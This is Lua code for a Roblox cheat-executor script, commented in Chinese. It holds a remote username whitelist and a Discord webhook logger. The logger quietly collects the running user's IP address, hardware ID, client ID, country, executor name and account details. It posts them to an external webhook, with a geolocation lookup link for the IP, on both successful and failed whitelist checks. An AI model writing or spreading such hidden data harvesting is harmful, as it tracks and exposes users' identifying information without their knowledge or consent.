-- ************************ Discord 完整日志函數 ************************
local function safeCall(func, fallback)
    local success, result = pcall(func)
    return success and result or fallback
end

local function getAvatarImage(userId)
    return safeCall(function()
        local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
        local response = HttpService:JSONDecode(game:HttpGet(url))
        return response.data[1].imageUrl
    end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
end

local function getDeviceType()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    
    if touch and not keyboard and not mouse then return "移动设备"
    elseif not touch and keyboard and mouse then return "电脑"
    elseif touch and keyboard and mouse then return "模拟器"
    else return "未知" end
end

local function getExecutor()
    return (identifyexecutor and identifyexecutor()) or 
           (getexecutorname and getexecutorname()) or 
           "未知"
end

local function getHWID()
    return (gethwid and gethwid()) or "无法获取"
end

local function getIPAddress()
    local request = http_request or request or (syn and syn.request)
    if not request then return "无请求函数" end
    
    return safeCall(function()
        return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
    end, "获取失败")
end

-- 發送 Discord 日志（支援自訂狀態）
local function SendDiscordLog(status, reason)
    local player = LocalPlayer
    if not player then return end
    
    local userId = player.UserId
    local placeId = game.PlaceId
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local LocalizationService = game:GetService("LocalizationService")
    
    -- 根據狀態設定顏色和標題
    local color
    local title
    if status == "success" then
        color = tonumber("0x32CD32")  -- 綠色
        title = string.format("✅ 白名單玩家使用腳本 - %s %d時%d分", 
            os.date("%Y年%m月%d日"), 
            tonumber(os.date("%H")), 
            tonumber(os.date("%M")))
    else
        color = tonumber("0xFF4444")  -- 紅色
        title = string.format("❌ 白名單驗證失敗 - %s %d時%d分", 
            os.date("%Y年%m月%d日"), 
            tonumber(os.date("%H")), 
            tonumber(os.date("%M")))
    end
    
    local payload = {
        username = "小傑腳本監控",
        embeds = {{
            color = color,
            title = title,
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                -- 基本資訊
                {name = "用戶名", value = player.Name, inline = true},
                {name = "顯示名稱", value = player.DisplayName, inline = true},
                {name = "用戶ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                -- 客戶端資訊
                {name = "客戶端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                -- 地圖資訊
                {name = "地圖ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地圖名稱", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                -- 執行器資訊
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "賬號年齡", value = string.format("%d天", player.AccountAge), inline = true},
                
                -- 設備資訊
                {name = "設備", value = getDeviceType(), inline = false},
                {name = "國家", value = safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(player) end, "获取失败"), inline = false},
                {name = "語言", value = player.LocaleId, inline = false},
                
                -- 硬體資訊
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查詢", value = string.format("https://www.geolocation.com/zh_tw?ip=%s#ipresult", getIPAddress()), inline = false},
            },
            footer = {text = "小傑腳本 · 白名單系統", icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId}
        }}
    }
    
    -- 如果是失敗狀態，加入失敗原因
    if status == "fail" and reason then
        table.insert(payload.embeds[1].fields, 1, {name = "❌ 失敗原因", value = reason, inline = false})
    end
    
    local request = http_request or request or HttpPost or (syn and syn.request)
    if request then
        safeCall(function()
            request({
                Url = GS_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
            print("✅ Discord 日志已發送 - 狀態: " .. status)
        end)
    end
end

-- ************************ 遠程加載白名單函數 ************************
local function LoadRemoteWhitelist()
    table.clear(TCWhitelist)
    
    local success, result = pcall(function()
        local remoteJson = game:HttpGet(WHITELIST_REMOTE_URL, true)
        local remoteWhitelist = HttpService:JSONDecode(remoteJson)
        
        for username, isEnabled in pairs(remoteWhitelist) do
            if username and isEnabled then
                TCWhitelist[string.lower(username)] = true
            end
        end
        return true
    end)
    
    if not success then
        local errorMsg = string.format("遠程白名單加載失敗：%s", tostring(result))
        warn(errorMsg)
        return false, errorMsg
    end
    
    local whitelistCount = 0
    for _ in pairs(TCWhitelist) do
        whitelistCount = whitelistCount + 1
    end
    warn(string.format("遠程白名單加載成功，共加載 %d 個授權用戶", whitelistCount))
    return true, nil
end

-- 白名單檢測函數
local function IsPlayerWhitelisted(player)
    if not player or not player:IsA("Player") then
        return false
    end
    return TCWhitelist[string.lower(player.Name)] or false
end

